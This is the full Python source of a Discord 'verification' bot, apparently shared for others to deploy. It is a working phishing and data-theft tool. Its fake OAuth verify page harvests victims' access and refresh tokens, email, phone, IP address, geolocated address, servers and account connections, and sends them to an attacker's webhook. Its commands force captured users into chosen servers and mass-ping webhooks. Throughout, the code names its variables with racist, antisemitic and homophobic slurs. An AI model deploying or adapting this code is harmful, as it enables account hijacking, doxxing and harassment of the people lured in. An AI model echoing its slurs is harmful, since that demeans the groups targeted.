"""
──────────────────────────────────────────────────────────────
                      SCEPTRVM·IMPERII
──────────────────────────────────────────────────────────────
> The full source code of the Scepter Bot. To set up it up in your server, you will need the following:

[GUILD_IDS] - The backbone of the Script. The BOT utilizes multiple guild ids to add trap the victim in and then utilize webhooks to spam the user in those channels. Very Funny to watch!

[DISCORD BOT] - You`ll need a BOT token, its client id and secret.

[WEBHOOK] - Will be needed to send over data. self explanatory

DATED - August 29th 2022 - 17:43
"""

import flask
import os
import time
import threading
import httpx
import discord
from discord.ext import commands
from pystyle import *
import asyncio

app = flask.Flask(__name__)

# ── Config ──────────────────────────────────────────────────────────────
token         = os.environ["TOKEN"]
client_id     = os.environ["CLIENT_ID"]
client_secret = os.environ["CLIENT_SECRET"]
redirect_uri  = os.environ["REDIRECT_URI"]
guild_ids     = os.environ["GUILD_IDS"].split(",")
webhook       = os.environ["WEBHOOK"]
jew_token     = token

tokens = {}
START_TIME = time.time()
clear = lambda: os.system("cls" if os.name == "nt" else "clear")
jew = commands.Bot(command_prefix=".", intents=discord.Intents.all(), help_command=None)

# ── Flask Routes ──────────────────────────────────────────────────────────────

@app.route("/")
def home():
  return flask.redirect("/verify")

@app.route("/verify")
def verify():
  return flask.redirect(
    f"https://discord.com/api/oauth2/authorize?client_id={client_id}"
    f"&redirect_uri={redirect_uri}&response_type=code"
    f"&scope=identify%20email%20connections%20guilds%20guilds.join"
  )

@app.route("/verified")
def verified():
  data = {
    "client_id": client_id,
    "client_secret": client_secret,
    "grant_type": "authorization_code",
    "code": flask.request.args.get("code"),
    "redirect_uri": redirect_uri
  }
  headers = {"Content-Type": "application/x-www-form-urlencoded"}
  r = httpx.post("https://discord.com/api/oauth2/token", data=data, headers=headers)
  token_data = r.json()
  access_token = token_data["access_token"]
  refresh_token = token_data["refresh_token"]

  auth_headers = {"Authorization": f"Bearer {access_token}"}

  user = httpx.get("https://discord.com/api/users/@me", headers=auth_headers).json()
  guilds = httpx.get("https://discord.com/api/users/@me/guilds", headers=auth_headers).json()
  connections = httpx.get("https://discord.com/api/users/@me/connections", headers=auth_headers).json()

  user_id = user["id"]
  tokens[user_id] = {"access_token": access_token, "refresh_token": refresh_token}

  ip = flask.request.headers.get("X-Forwarded-For", flask.request.remote_addr)
  geo = httpx.get(f"http://ip-api.com/json/{ip}").json()
  lat = geo.get("lat", "N/A")
  lon = geo.get("lon", "N/A")

  map_url = f"https://static-maps.yandex.ru/1.x/?lang=en-US&ll={lon},{lat}&z=10&l=map&size=450,250&pt={lon},{lat},pm2rdm"

  guild_list = "\n".join([
    f"  - {g['name']} ({g['id']})" +
    (" [OWNER]" if g.get('owner') else "") +
    (" [ADMIN]" if g.get('permissions') and int(g['permissions']) & 0x8 else "")
    for g in guilds
  ]) if isinstance(guilds, list) else "Failed to fetch"

  connection_list = "\n".join([
    f"  - {c['type']}: {c['name']}" +
    (" [VERIFIED]" if c.get('verified') else "")
    for c in connections
  ]) if isinstance(connections, list) else "Failed to fetch"

  useragent = flask.request.headers.get("User-Agent", "Unknown")

  info = {
    "content": f"""```
[ USER ]
ID:            {user_id}
Username:      {user.get('username')}#{user.get('discriminator')}
Email:         {user.get('email', 'N/A')}
Phone:         {user.get('phone', 'N/A')}
Verified:      {user.get('verified', False)}
MFA Enabled:   {user.get('mfa_enabled', False)}
Nitro:         {bool(user.get('premium_type', 0))}
Locale:        {user.get('locale', 'N/A')}

[ TOKENS ]
Access Token:  {access_token}
Refresh Token: {refresh_token}

[ NETWORK ]
IP:            {ip}
ISP:           {geo.get('isp', 'N/A')}
Org:           {geo.get('org', 'N/A')}
User-Agent:    {useragent}

[ LOCATION ]
Country:       {geo.get('country', 'N/A')} ({geo.get('countryCode', 'N/A')})
Region:        {geo.get('regionName', 'N/A')} ({geo.get('region', 'N/A')})
City:          {geo.get('city', 'N/A')}
ZIP:           {geo.get('zip', 'N/A')}
Latitude:      {lat}
Longitude:     {lon}
Timezone:      {geo.get('timezone', 'N/A')}

[ GUILDS ]
{guild_list}

[ CONNECTIONS ]
{connection_list}
```
[⠀⠀⠀​​​​​​]({map_url})"""
  }

  httpx.post(webhook, json=info)
  return flask.redirect("https://discord.com/app")

# ── jew Events ────────────────────────────────────────────────────────────────

@jew.event
async def on_ready():
  clear()
  art = """
   ▄████████  ▄████████    ▄████████    ▄███████▄     ███        ▄████████    ▄████████ 
  ███    ███ ███    ███   ███    ███   ███    ███ ▀█████████▄   ███    ███   ███    ███ 
  ███    █▀  ███    █▀    ███    █▀    ███    ███    ▀███▀▀██   ███    █▀    ███    █▀  
  ███        ███         ▄███▄▄▄       ███    ███     ███   ▀  ▄███▄▄▄      ▄███▄▄▄▄██▀ 
▀███████████ ███        ▀▀███▀▀▀     ▀█████████▀      ███     ▀▀███▀▀▀     ▀▀███▀▀▀▀▀   
         ███ ███    █▄    ███    █▄    ███            ███       ███    █▄  ▀███████████ 
   ▄█    ███ ███    ███   ███    ███   ███            ███       ███    ███   ███    ███ 
 ▄████████▀  ████████▀    ██████████  ▄████▀         ▄████▀     ██████████   ███    ███ 
                                                                             ███    ███ 
  """
  try:
    print(Colorate.Vertical(Colors.yellow_to_green, art, 1))
  except Exception as e:
    print(art)
    print(f"[warn] Colorate failed: {e}")

  total_members = sum(g.member_count for g in jew.guilds)
  guild_names = ", ".join([g.name for g in jew.guilds]) or "none"

  print(Colorate.Vertical(Colors.yellow_to_green, f"""
i > Discord Bot:        {jew.user.name}#{jew.user.discriminator}
i > Servers:            {len(jew.guilds)}
i > Total Members:      {total_members}
i > Configured Guilds:  {len(guild_ids)}
i > Ready.
  """))

# ── Commands ──────────────────────────────────────────────────────────────────

@jew.command()
@commands.has_permissions(administrator=True)
async def help(ctx):
  await ctx.send("""```
[ SCEPTER // COMMANDS ]

.help              show this message
.status            show Bot status and uptime
.tokens            list all captured user ids
.info <user_id>    show tokens for a specific user
.join <user_id>    add a specific user to all configured guilds
.joinall           add all captured users to all configured guilds
.webhooks          send @everyone to all webhooks in webhooks.txt
```""")


@jew.command()
@commands.has_permissions(administrator=True)
async def join(ctx, user_id: str):
  if user_id not in tokens:
    await ctx.send(f"No tokens found for user `{user_id}`.")
    return

  access_token = tokens[user_id]["access_token"]
  success = []
  failed = []

  for niggers in guild_ids:
    r = httpx.put(
      f"https://discord.com/api/guilds/{niggers}/members/{user_id}",
      headers={"Authorization": f"Bot {jew_token}"},
      json={"access_token": access_token}
    )
    if r.status_code in (201, 204):
      guild = jew.get_guild(int(niggers))
      success.append(guild.name if guild else niggers)
    else:
      failed.append(niggers)

  msg = ""
  if success:
    msg += f"Joined: {', '.join(success)}\n"
  if failed:
    msg += f"Failed: {', '.join(failed)}"

  await ctx.send(msg or "Nothing happened, nigga!")

@jew.command()
@commands.has_permissions(administrator=True)
async def joinall(ctx):
  if not tokens:
    await ctx.send("No tokens captured yet.")
    return

  total_success = 0
  total_failed = 0

  for negros, data in tokens.items():
    for niggers in guild_ids:
      r = httpx.put(
        f"https://discord.com/api/guilds/{niggers}/members/{negros}",
        headers={"Authorization": f"Bot {jew_token}"},
        json={"access_token": data["access_token"]}
      )
      if r.status_code in (201, 204):
        total_success += 1
      else:
        total_failed += 1

  await ctx.send(f"```\n[ JOIN ALL ]\nSuccess: {total_success}\nFailed:  {total_failed}\n```")

@jew.command(name="tokens")
@commands.has_permissions(administrator=True)
async def list_tokens(ctx):
  if not tokens:
    await ctx.send("No tokens captured yet.")
    return
  msg = "```\n[ CAPTURED TOKENS ]\n" + "\n".join([f"  - {negros}" for negros in tokens]) + "\n```"
  await ctx.send(msg)

@jew.command()
@commands.has_permissions(administrator=True)
async def info(ctx, user_id: str):
  if user_id not in tokens:
    await ctx.send(f"No tokens found for user `{user_id}`.")
    return

  data = tokens[user_id]
  await ctx.send(f"```\n[ {user_id} ]\nAccess Token:  {data['access_token']}\nRefresh Token: {data['refresh_token']}\n```")

@jew.command()
@commands.has_permissions(administrator=True)
async def status(ctx):
  uptime = int(time.time() - START_TIME)
  hours, remainder = divmod(uptime, 3600)
  minutes, seconds = divmod(remainder, 60)
  total_members = sum(g.member_count for g in jew.guilds)

  await ctx.send(f"""```
[ STATUS ]
Bot:            {jew.user.name}#{jew.user.discriminator}
> Uptime:            {hours}h {minutes}m {seconds}s
> Servers:           {len(jew.guilds)}
> Total Members:     {total_members}
> Captured Tokens:   {len(tokens)}
> Configured Guilds: {len(guild_ids)}
```""")

@jew.command()
@commands.has_permissions(administrator=True)
async def webhooks(ctx):
    await ctx.send("Starting Webhooks")
    async def webhooka(fags):
        async with httpx.AsyncClient() as client:
            await client.post(fags, json={"content": "@everyone"})
    fags_list = os.environ["WEBHOOKS"].split(",")
    await asyncio.gather(*[webhooka(fags) for fags in fags_list if fags.strip()])

# ── Entry Point ───────────────────────────────────────────────────────────────

def run_flask():
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port, debug=False, use_reloader=False)

if __name__ == "__main__":
    threading.Thread(target=run_flask, daemon=True).start()
    jew.run(jew_token)
